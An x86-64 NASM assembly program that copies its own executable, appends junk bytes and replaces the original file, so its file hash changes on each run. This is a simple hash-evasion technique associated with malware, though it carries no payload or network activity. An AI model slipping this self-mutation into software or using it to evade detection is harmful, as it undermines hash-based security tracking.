section .data
    copy_filename_old db "dynamic_fingerprint",0
    copy_filename db "dynamic_fingerprint_copy", 0
    current_process_file db "/proc/self/exe", 0
    junk db "junk"

section .text
    global _start

_start:
    mov rax, 2 ; sys_open
    mov rdi, current_process_file
    mov rsi, 0 ; read only
    mov rdx, 0
    syscall
    mov r12, rax ; r12 = fd current_process_file

    mov rax, 2 ; sys_open
    mov rdi, copy_filename
    mov rsi, 577 ; write only | create if not exist | overwrite (trunc)
    mov rdx, 0777q
    syscall
    mov r13, rax ; r13 = fd copy_filename

    mov rax, 40  ; sys_sendfile
    mov rdi, r13 ; copy_filename (dst)
    mov rsi, r12 ; current_process_file (src)
    mov rdx, 0 ; from octet 0
    mov r10, 0x7FFFFFFF ; to EOF (end of the file)
    syscall

    mov rax, 1 ; sys_write
    mov rdi, r13
    mov rsi, junk
    mov rdx, 4
    syscall

    mov rax, 87            ; syscall unlink
    mov rdi, copy_filename_old
    syscall

    mov rax, 82            ; syscall rename
    mov rdi, copy_filename
    mov rsi, copy_filename_old
    syscall

close_file:
    mov rax, 3
    mov rdi, r12
    syscall
    mov rax, 3
    mov rdi, r13
    syscall

exit:
    mov rax, 60
    xor rdi, rdi
    syscall